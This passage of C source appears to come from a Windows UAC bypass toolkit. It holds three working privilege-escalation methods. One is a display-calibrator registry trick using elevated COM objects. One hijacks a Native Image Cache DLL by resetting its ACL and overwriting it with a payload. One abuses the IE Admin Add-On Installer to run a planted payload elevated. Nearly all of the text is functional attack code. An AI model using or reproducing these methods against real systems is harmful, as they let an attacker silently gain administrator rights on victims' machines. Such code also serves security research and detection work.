        if (CMLuaUtil == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        //
        // Write new custom calibrator value to HKLM.
        //
        r = CMLuaUtil->lpVtbl->SetRegistryStringValue(CMLuaUtil,
            HKEY_LOCAL_MACHINE,
            T_DISPLAY_CALIBRATION,
            T_CALIBRATOR_VALUE,
            lpszPayload);

        if (FAILED(r)) {
            break;
        }

        //
        // Create elevated COM object for ColorDataProxy.
        //
        r = ucmAllocateElevatedObject(
            T_CLSID_ColorDataProxy,
            &IID_IColorDataProxy,
            CLSCTX_LOCAL_SERVER,
            &ColorDataProxy);


        if (r != S_OK) {
            break;
        }

        if (ColorDataProxy == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        //
        // Run our "custom calibrator".
        //
        r = ColorDataProxy->lpVtbl->LaunchDccw(ColorDataProxy, 0);

        if (SUCCEEDED(r))
            MethodResult = STATUS_SUCCESS;

        Sleep(1000);

        //
        // Remove calibrator value.
        //
        CMLuaUtil->lpVtbl->DeleteRegistryStringValue(CMLuaUtil,
            HKEY_LOCAL_MACHINE,
            T_DISPLAY_CALIBRATION,
            T_CALIBRATOR_VALUE);

    } while (FALSE);

    if (CMLuaUtil != NULL) {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }

    if (ColorDataProxy != NULL) {
        ColorDataProxy->lpVtbl->Release(ColorDataProxy);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}

/*
* ucmxNgenLogLastWrite
*
* Purpose:
*
* Query ngen.log last write time.
*
*/
BOOL ucmxNgenLogLastWrite(
    _Out_ FILETIME *LastWriteTime
)
{
    BOOL bResult = FALSE;
    HANDLE hFile;
    WCHAR szFileName[MAX_PATH * 2];

    LastWriteTime->dwLowDateTime = 0;
    LastWriteTime->dwHighDateTime = 0;

    _strcpy(szFileName, g_ctx->szSystemRoot);
    _strcat(szFileName, MSNETFRAMEWORK_DIR);

#ifdef _WIN64
    _strcat(szFileName, TEXT("64"));
#endif

    _strcat(szFileName, TEXT("\\"));
    _strcat(szFileName, NET4_DIR);
    _strcat(szFileName, TEXT("\\"));
    _strcat(szFileName, TEXT("ngen.log"));

    hFile = CreateFile(szFileName, 
        GENERIC_READ, 
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, 
        OPEN_EXISTING,
        0,
        NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        bResult = GetFileTime(hFile, NULL, NULL, LastWriteTime);
        CloseHandle(hFile);
    }

    return bResult;
}

/*
* ucmNICPoisonMethod
*
* Purpose:
*
* Bypass UAC by by Dll hijack of Native Image Cache.
* Original author link: https://github.com/AzAgarampur/byeintegrity-uac
*
*/
NTSTATUS ucmNICPoisonMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    WCHAR szFileName[MAX_PATH * 2];
    WCHAR szTargetProc[MAX_PATH * 2];
    DWORD origSize = 0, bytesIO;
    PBYTE origFileBuffer = NULL;

    HANDLE hFile;

    LPWSTR oldSecurity = NULL;
    LPWSTR lpAssemblyFilePath = NULL, lpTargetFileName = NULL;

    BOOLEAN IsWin7;

#ifdef _DEBUG
    BOOLEAN bWaitFailed = FALSE;
#endif

    FILETIME lastWriteTime, checkTime;

    INT iRetryCount = 20;

    GUID targetMVID;
    FUSION_SCAN_PARAM scanParam;

    do {

        IsWin7 = (g_ctx->dwBuildNumber < 9200);

        if (!supInitFusion(IsWin7 ? 2 : 4))
            break;

        if (!supFusionGetAssemblyPathByName(TEXT("Accessibility"), &lpAssemblyFilePath))
            break;

        if (!supFusionGetImageMVID(lpAssemblyFilePath, &targetMVID))
            break;

        if (!IsWin7) {

            ucmxNgenLogLastWrite(&lastWriteTime);

            //
            // Run NET maintenance tasks.
            //
            _strcpy(szFileName, g_ctx->szSystemDirectory);
            _strcat(szFileName, MSCHEDEXE_EXE);

            if (!supRunProcess2(szFileName,
                TEXT("Start"),
                NULL,
                SW_HIDE,
                SUPRUNPROCESS_TIMEOUT_DEFAULT))
            {
                break;
            }

            //
            // Wait for task completion.
            //

#ifdef _DEBUG
            bWaitFailed = TRUE;
#endif

            do {

                Sleep(2000);

                if (FALSE == supIsProcessRunning(TEXT("ngentask.exe"))) {

                    if (ucmxNgenLogLastWrite(&checkTime)) {

                        if (CompareFileTime(&lastWriteTime, &checkTime) < 0) {
#ifdef _DEBUG
                            bWaitFailed = FALSE;
#endif
                            break;
                        }
                    }

                }

                --iRetryCount;

            } while (iRetryCount);

        }

#ifdef _DEBUG
        if (bWaitFailed) {
            OutputDebugString(TEXT(">>wait failed"));
            DebugBreak();
        }
#endif

        //
        // Locate target NI file.
        //
        scanParam.ReferenceMVID = &targetMVID;
        scanParam.lpFileName = NULL;

        _strcpy(szFileName, g_ctx->szSystemRoot);
        _strcat(szFileName, TEXT("assembly\\NativeImages_"));
        if (IsWin7)
            _strcat(szFileName, NET2_DIR);
        else
            _strcat(szFileName, NET4_DIR);

#ifdef _WIN64
        _strcat(szFileName, TEXT("_64"));
#else
        _strcat(szFileName, TEXT("_32"));
#endif
        _strcat(szFileName, TEXT("\\Accessibility\\"));

        if (!supFusionScanDirectory(szFileName,
            TEXT("*.dll"),
            (pfnFusionScanFilesCallback)supFusionFindFileByMVIDCallback,
            &scanParam))
        {
            break;
        }

        lpTargetFileName = scanParam.lpFileName;
        if (lpTargetFileName == NULL)
            break;

        //
        // Read existing file to memory.
        //
        origFileBuffer = supReadFileToBuffer(lpTargetFileName, &origSize);
        if (origFileBuffer == NULL)
            break;

        //
        // Remember old file security permissions.
        //
        oldSecurity = NULL;
        if (!ucmMasqueradedGetObjectSecurityCOM(lpTargetFileName,
            DACL_SECURITY_INFORMATION,
            SE_FILE_OBJECT,
            &oldSecurity))
        {
            break;
        }

        //
        // Reset target file permissions.
        //
        if (!ucmMasqueradedSetObjectSecurityCOM(lpTargetFileName,
            DACL_SECURITY_INFORMATION,
            SE_FILE_OBJECT,
            T_SDDL_ALL_FOR_EVERYONE))
        {
            break;
        }

        //
        // Overwrite file with Fubuki.
        //
        hFile = CreateFile(lpTargetFileName,
            GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL);

        if (hFile != INVALID_HANDLE_VALUE) {
            WriteFile(hFile, ProxyDll, ProxyDllSize, &bytesIO, NULL);
            SetEndOfFile(hFile);
            CloseHandle(hFile);
        }
        else
            break;

        //
        // Run target.
        //
        _strcpy(szTargetProc, g_ctx->szSystemDirectory);
        _strcat(szTargetProc, MMC_EXE);

        if (supRunProcess2(szTargetProc,
            TEXT("wf.msc"),
            NULL,
            SW_HIDE,
            SUPRUNPROCESS_TIMEOUT_DEFAULT))
        {
            MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    if (lpAssemblyFilePath)
        supHeapFree(lpAssemblyFilePath);

    //
    // Restore original file contents and permissions.
    //
    if (origFileBuffer && lpTargetFileName) {

        hFile = CreateFile(lpTargetFileName,
            GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL);

        if (hFile != INVALID_HANDLE_VALUE) {
            WriteFile(hFile, origFileBuffer, origSize, &bytesIO, NULL);
            SetEndOfFile(hFile);
            CloseHandle(hFile);
        }

        supVirtualFree(origFileBuffer, NULL);

        if (oldSecurity) {

            ucmMasqueradedSetObjectSecurityCOM(lpTargetFileName,
                DACL_SECURITY_INFORMATION,
                SE_FILE_OBJECT,
                oldSecurity);

            CoTaskMemFree(oldSecurity);
        }

        supHeapFree(lpTargetFileName);
    }

    return MethodResult;
}

/*
* ucmIeAddOnInstallMethod
*
* Purpose:
*
* Bypass UAC by IE Admin Add-On Installer COM object.
* Original author link: https://github.com/AzAgarampur/byeintegrity2-uac
*
*/
NTSTATUS ucmIeAddOnInstallMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT  r = E_FAIL, hr_init;

    IIEAdminBrokerObject* BrokerObject = NULL;
    IActiveXInstallBroker* InstallBroker = NULL;

    BSTR adminInstallerUuid = NULL;
    BSTR cacheItemFilePath = NULL, fileToVerify = NULL;

    ULONG dummy = 0;
    PUCHAR dummyPtr = NULL;

    PWCHAR lpPayloadFile = NULL, lpTargetDir = NULL, lpFileName = NULL, lpDirectory = NULL;
    SIZE_T cchBuffer;

    HANDLE processHandle = NULL;

    BSTR workdirBstr;

    WCHAR szDummyTarget[MAX_PATH * 2];

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_DEFAULT_ENTRYPOINT,
            TRUE))
        {
            break;
        }

        //
        // VerifyFile required.
        //
        r = CoInitializeSecurity(NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_CONNECT,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            0,
            NULL);

        if (FAILED(r)) {
            break;
        }

        //
        // Allocated elevated factory object.
        //
        r = ucmAllocateElevatedObject(T_CLSID_IEAAddonInstaller,
            &IID_IEAxiAdminInstaller,
            CLSCTX_LOCAL_SERVER,
            &BrokerObject);

        if (FAILED(r)) {
            break;
        }

        r = BrokerObject->lpVtbl->InitializeAdminInstaller(BrokerObject,
            NULL,
            0,
            &adminInstallerUuid);

        if (FAILED(r)) {
            break;
        }

        //
        // Query install broker object.
        //
        r = BrokerObject->lpVtbl->QueryInterface(BrokerObject,
            &IID_IEAxiInstaller2,
            &InstallBroker);

        if (FAILED(r)) {
            break;
        }

        _strcpy(szDummyTarget, g_ctx->szSystemDirectory);
        _strcat(szDummyTarget, CONSENT_EXE);

        r = E_FAIL;

        //
        // Verify image embedded signature.
        // Uppon success copy given file to the temporary directory and return full filepath.
        //
        fileToVerify = SysAllocString(szDummyTarget);
        if (fileToVerify) {

            r = InstallBroker->lpVtbl->VerifyFile(InstallBroker,
                adminInstallerUuid,
                (HWND)INVALID_HANDLE_VALUE,
                fileToVerify,
                fileToVerify,
                NULL,
                WTD_UI_NONE,
                WTD_UICONTEXT_EXECUTE,
                &IID_IUnknown,
                &cacheItemFilePath,
                &dummy,
                &dummyPtr);

            if (dummyPtr)
                CoTaskMemFree(dummyPtr);

            SysFreeString(fileToVerify);
        }

        if (FAILED(r)) {
            break;
        }

        //
        // Kill file in cache
        //
        if (!ucmMasqueradedDeleteDirectoryFileCOM(cacheItemFilePath))
            break;

        //
        // Replace file in cache with Fubuki.
        //
        cchBuffer = (SIZE_T)SysStringLen(cacheItemFilePath);
        lpPayloadFile = (PWCHAR)supHeapAlloc(cchBuffer * 2);
        if (lpPayloadFile == NULL)
            break;

        lpTargetDir = (PWCHAR)supHeapAlloc(cchBuffer * 2);
        if (lpTargetDir == NULL)
            break;

        lpFileName = _filename(cacheItemFilePath);
        if (lpFileName == NULL)
            break;

        _strcpy(lpPayloadFile, g_ctx->szTempDirectory);
        _strcat(lpPayloadFile, lpFileName);

        if (!supWriteBufferToFile(lpPayloadFile, ProxyDll, ProxyDllSize))
            break;

        lpDirectory = _filepath(cacheItemFilePath, lpTargetDir);
        if (lpDirectory == NULL)
            break;

        if (!ucmMasqueradedMoveCopyFileCOM(lpPayloadFile, lpDirectory, TRUE))
            break;

        //
        // Run file from cache.
        //
        workdirBstr = SysAllocString(g_ctx->szTempDirectory);
        if (workdirBstr) {

            r = InstallBroker->lpVtbl->RunSetupCommand(InstallBroker,
                adminInstallerUuid,
                NULL,
                cacheItemFilePath,
                TEXT(""),
                workdirBstr,
                TEXT(""),
                4, //RSC_FLAG_QUIET
                &processHandle); //there is always no process handle on output, ignore.

            SysFreeString(workdirBstr);

            if (r == E_INVALIDARG)
                MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    //
    // Post execution cleanup.
    //

    if (InstallBroker)
        InstallBroker->lpVtbl->Release(InstallBroker);

    if (BrokerObject)
        BrokerObject->lpVtbl->Release(BrokerObject);

    if (adminInstallerUuid)
        SysFreeString(adminInstallerUuid);

    if (MethodResult == STATUS_SUCCESS) {
        if (lpDirectory) {
            ucmMasqueradedDeleteDirectoryFileCOM(lpDirectory);
        }
    }

    if (cacheItemFilePath)
        SysFreeString(cacheItemFilePath);

    if (lpTargetDir)
        supHeapFree(lpTargetDir);

    if (lpPayloadFile)
        supHeapFree(lpPayloadFile);

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}
